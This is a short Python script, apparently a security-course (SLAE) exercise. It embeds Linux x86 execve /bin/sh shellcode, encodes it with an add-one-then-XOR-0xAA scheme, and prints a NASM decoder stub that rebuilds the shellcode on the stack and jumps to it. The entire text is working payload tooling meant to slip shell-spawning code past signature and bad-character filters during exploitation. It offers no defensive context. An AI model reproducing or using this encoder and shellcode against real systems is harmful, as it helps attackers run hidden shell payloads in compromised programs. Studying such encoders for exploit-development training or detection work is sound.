# Decoder - Linux/x86 NASM
# Author: Nathu Nandwani
# SecurityTube ID: SLAE-1261

#Encoding Algorithm: (x + 0x01) xor 0xAA = y (Encoded)
#Limitation: Not able to support x = 0xA9 (Will result to 0x00)

#execve-shellcode
shellcode = "\x31\xc0\x50\x50\x50\x68\x2f\x2f\x73\x68"
shellcode +="\x68\x2f\x62\x69\x6e\x89\x64\x24\x0c\x89"
shellcode +="\xe3\x8d\x4c\x24\x0c\x8b\x54\x24\x10\xb0"
shellcode +="\x0b\xcd\x80"

shellcode = shellcode[::-1]
remainder = len(shellcode) % 4

counter = 0
push_ctr = 0

encoded = "global _start\n"
encoded +="section .text\n"
encoded +="_start:\n"
encoded +="    xor ecx, ecx\n"
encoded +="    xor ebx, ebx\n"
encoded +="    imul ecx\n"

for i in shellcode:
    if counter % 4 == 0:
        encoded += "\n    push 0x"
        push_ctr += 1
    counter += 1
    encoded += ("%0.2X" % ((ord(i) + 1) ^ 170))
if remainder > 0:
    for i in range(4 - remainder):
        encoded += "3B" # 0x90 + 0x01 xor 0xAA
encoded +="\n    mov cl, " + str(push_ctr * 4) + "\n\n"
encoded +="again:\n"
encoded +="    mov al, byte[esp + ebx]\n"
encoded +="    xor al, 0xaa\n"
encoded +="    dec al\n"
encoded +="    mov byte[esp + ebx], al\n"
encoded +="    inc ebx\n"
encoded +="    loop again\n"
encoded +="    jmp esp\n"
print encoded
